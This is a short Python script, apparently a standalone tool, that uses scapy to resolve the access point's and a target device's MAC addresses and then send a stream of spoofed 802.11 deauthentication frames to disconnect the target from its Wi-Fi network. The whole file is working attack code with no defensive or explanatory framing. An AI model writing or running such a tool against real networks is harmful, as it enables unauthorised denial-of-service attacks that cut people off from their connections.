import scapy.all as scapy


def get_ap_ip():
    return scapy.conf.route.route("8.8.8.8")[2]
  
  
def get_user_ip():
    return scapy.conf.route.route("8.8.8.8")[1]


def get_interface(ip_address):
    for interface in scapy.ifaces.values():
        if interface.ip == ip_address:
            return interface.name


def get_mac_address(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    arp_response = scapy.sr1(arp_request, timeout=1, verbose=False)
    if arp_response is not None:
        return arp_response.hwsrc
    else:
        return None


def send_deauth(target_ip, count):
    """Send De-authentication packets to the target device.
    Expected parameters: <String> IP address , <Integer> Packet count.
    """
    ap_ip = get_mac_address(get_ap_ip())
    interface = get_interface(get_user_ip())
    target_mac = get_mac_address(target_ip)

    packet = scapy.RadioTap() / scapy.Dot11(addr1=target_mac, addr2=ap_ip, addr3=ap_ip) / scapy.Dot11Deauth()
    scapy.sendp(packet, inter=0.1, count=count, iface=interface, verbose=1)